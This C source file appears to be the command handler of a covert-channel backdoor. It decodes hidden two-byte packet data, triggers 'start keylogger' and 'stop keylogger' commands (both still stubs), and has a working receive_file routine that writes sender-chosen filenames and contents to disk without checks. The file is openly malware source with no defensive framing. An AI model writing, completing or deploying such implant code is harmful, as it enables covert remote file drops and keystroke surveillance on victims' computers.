#include "utils/utils.h"
#include "protocol.h"

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int calculate_data_packet_count(const struct session_info * session_info) {
    return session_info->packet_counter - COMMAND_TRIGGER_THRESHOLD;
}

void clear_process_packets(struct session_info * session_info) {
    free_linked_list(session_info->head);
    struct packet_data * head = malloc(sizeof(struct packet_data));
    head->data = 0;
    head->next = NULL;
    session_info->head = head;
    session_info->data_counter = 0;
    session_info->packet_counter = 0;
}

void sort_linked_list(struct packet_data * node) {

}

bool handle_command_codes(struct session_info * session_info, const struct packet_data * node) {
    enum command_codes encountered_command_code = {};
    bool is_command_code = true;

    const uint8_t last_byte = node->data & 0xFF;

    switch (last_byte) {
        case START_KEYLOGGER:
            log_message("Start Keylogger\n");
            encountered_command_code = START_KEYLOGGER;
            break;
        case STOP_KEYLOGGER:
            log_message("Stop Keylogger\n");
            encountered_command_code = STOP_KEYLOGGER;
            break;
        case RECEIVE_FILE:
            log_message("Receiving File\n");
            encountered_command_code = RECEIVE_FILE;
            break;
        default:
            log_message("Default\n");
            is_command_code = false;
            break;
    }

    if (is_command_code) {
        if (session_info->last_command_code == encountered_command_code) {
            session_info->command_counter++;
        } else {
            session_info->last_command_code = encountered_command_code;
            session_info->command_counter = 1;
        }

        log_message("Session info counter: %d, code: %d", session_info->command_counter, encountered_command_code);

        // If the counter hits 2 then execute the corresponding function
        if (session_info->command_counter >= COMMAND_TRIGGER_THRESHOLD) {
            log_message("Triggered function call: counter %d, code: %d", session_info->command_counter, encountered_command_code);
            session_info->command_counter = 0;
            for (int i = 0; command_handler_functions[i].key != 0; i++) {
                if (command_handler_functions[i].key == encountered_command_code) {
                    command_handler_functions[i].handler(session_info);
                    return true;
                }
            }
        }

    }

    return false;
}

void handle_packet_data(struct session_info * session_info, struct packet_data * node) {
    if (session_info->head == NULL) {
        session_info->head = node;
        handle_command_codes(session_info, node);
        session_info->packet_counter++;
        return;
    }

    struct packet_data * packet_data = session_info->head;

    // Traverse to the last filled node
    while (packet_data->next != NULL) {
        packet_data = packet_data->next;
    }

    // Sort LL

    // Add data
    packet_data->next = node;
    session_info->packet_counter++;

    const int clear_linked_list = handle_command_codes(session_info, node);

    if (clear_linked_list) {
        log_message("Clearing linked list");
        clear_process_packets(session_info);
    }
}


void start_keylogger(struct session_info * session_info) {
    log_message("Starting Keylogger");
}

void stop_keylogger(struct session_info * session_info) {
    log_message("Stoping Keylogger");
    session_info->run_keylogger = false;
}

// NOLINTNEXTLINE
void receive_file(struct session_info * session_info) {
    print_linked_list(session_info->head);

    const int data_packet_to_read = calculate_data_packet_count(session_info);
    log_message("Data packets to read %d", data_packet_to_read);
    log_message("Packet counter: %d, Data Counter: %d", session_info->packet_counter, session_info->data_counter);

    const struct packet_data * packet_data = session_info->head;

    char filename[256] = {0};
    int filename_len = 0;

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        log_message("First Byte %d", first_byte);
        log_message("Second Byte %d", second_byte);

        // First (5, 5) sentinel signals end of filename
        if (first_byte == FILENAME && second_byte == FILENAME) {
            packet_data = packet_data->next;
            break;
        }

        if (filename_len < (int)sizeof(filename) - 2) {
            filename[filename_len++] = (char)first_byte;
            filename[filename_len++] = (char)second_byte;
        }

        packet_data = packet_data->next;
    }

    if (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        if (first_byte == FILENAME && second_byte == FILENAME) {
            packet_data = packet_data->next;
        }
    }

    while (filename_len > 0 && (filename[filename_len - 1] == '\0' || filename[filename_len - 1] == ' ')) {
        filename_len--;
    }
    filename[filename_len] = '\0';
    log_message("Filename: %s", filename);

    const int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        log_message("Failed to open file: %s", filename);
        return;
    }
    FILE * file = fdopen(fd, "wb");
    if (file == NULL) {
        log_message("Failed to open file: %s", filename);
        close(fd);
        return;
    }

    while (packet_data != NULL) {
        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
        const uint8_t second_byte = (packet_data->data) & 0xFF;
        log_message("First Byte %d", first_byte);
        log_message("Second Byte %d", second_byte);

        if (first_byte == RECEIVE_FILE || second_byte == RECEIVE_FILE) {
            break;
        }

        if (first_byte == 0) {
            fwrite(&second_byte, 1, 1, file);
        } else {
            fwrite(&first_byte,  1, 1, file);
            fwrite(&second_byte, 1, 1, file);
        }

        packet_data = packet_data->next;
    }

    fclose(file);
    log_message("File saved: %s", filename);
}